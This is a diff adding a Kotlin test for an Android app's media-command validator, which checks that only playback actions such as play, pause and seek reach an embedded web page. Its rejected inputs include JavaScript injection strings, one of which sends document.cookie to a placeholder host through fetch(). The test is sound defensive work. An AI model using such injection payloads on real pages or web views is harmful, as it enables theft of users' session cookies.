@@ -240,3 +240,34 @@ class AudioMemoryTest {
     assertEquals(AudioMemory.Live, choose(savedEncodings = ""))
   }
 }
+
+/** Commandes du service de musique : rien d'autre que les commandes de lecture ne part vers la page. */
+class MediaActionsTest {
+  @Test
+  fun `les commandes de lecture passent`() {
+    for (action in listOf("play", "pause", "next", "previous", "stop", "seek:0", "seek:93500")) {
+      assertEquals(action, MediaActions.valid(action))
+    }
+    assertEquals("window.__plexrMedia && window.__plexrMedia('seek:93500')", MediaActions.script("seek:93500"))
+  }
+
+  @Test
+  fun `une action forgée par une autre application est ignorée`() {
+    val forged = listOf(
+      "');fetch('https://exemple.invalid/'+document.cookie);('",
+      "play');alert(1);('",
+      "seek:abc",
+      "seek:-5",
+      "seek:1;alert(1)",
+      "seek:99999999999999999999",
+      "PLAY",
+      "android.intent.action.MAIN",
+      "",
+    )
+    for (action in forged) {
+      assertNull(action, MediaActions.valid(action))
+      assertNull(action, MediaActions.script(action))
+    }
+    assertNull(MediaActions.valid(null))
+  }
+}
